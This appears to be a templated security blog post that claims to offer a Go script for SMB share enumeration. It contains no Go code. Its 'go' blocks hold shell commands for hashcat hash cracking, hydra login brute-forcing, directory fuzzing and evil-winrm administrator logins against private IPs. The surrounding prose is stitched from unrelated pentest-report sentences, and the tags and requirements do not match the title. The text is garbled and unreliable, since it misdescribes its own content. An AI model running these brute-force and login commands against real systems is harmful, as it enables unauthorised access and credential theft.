---
TitleSEO: "SMB Share Enumeration Script in Go | ZureFX"
TitlePost: "SMB Share Enumeration Script — Go"
Author: "ZureFX"
Description: "A Go script for smb share enumeration script. Built for security research and automation."
Keywords: "rust, scanner, c, go"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-398.html"
URL_IMAGES: ""
Date: "2025-01-29"
Tags: "Rust, Scanner, C, Go"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-398"
Permalink: "/scripting/script-smb-share-enumeration-script-398.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `dcomexec`
- `dcomexec`
- `kerbrute`

## Implementation

### Core Logic

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

```go
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.102.147.56 -u administrator -p 'P@ssw0rd!'
```

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

### Helper Functions

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

```go
gobuster dir -u http://10.87.24.179/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.222.161 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.30.125.218/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.86.58.183 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```bash
gobuster dir -u http://10.80.144.141/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.76.26.80 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 0.75s
```
